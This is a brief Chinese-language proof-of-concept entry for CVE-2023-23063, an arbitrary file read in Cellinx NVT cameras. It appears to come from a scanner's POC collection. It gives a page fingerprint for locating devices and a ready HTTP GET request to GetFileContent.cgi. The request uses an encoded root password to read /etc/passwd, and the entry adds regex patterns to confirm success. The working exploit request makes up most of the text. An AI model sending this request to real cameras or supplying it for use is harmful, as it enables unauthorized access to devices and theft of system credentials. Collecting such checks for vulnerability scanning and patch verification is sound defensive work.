﻿# Cellinx NVT 摄像机 GetFileContent.cgi任意文件读取漏洞

> 更新时间：2023-12-25

> 漏洞编号：CVE-2023-23063

> 漏洞说明：Cellinx NVT v1.0.6.002b版本存在安全漏洞，该漏洞源于存在本地文件泄露漏洞，攻击者可读取系统密码等敏感信息。

> 漏洞特征：body="local/NVT-string.js"

> 验证脚本：HTTP

```
GET /cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605 HTTP/1.1
Accept-Encoding: gzip
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：Cellinx NVT 摄像机 GetFileContent.cgi任意文件读取漏洞.poc
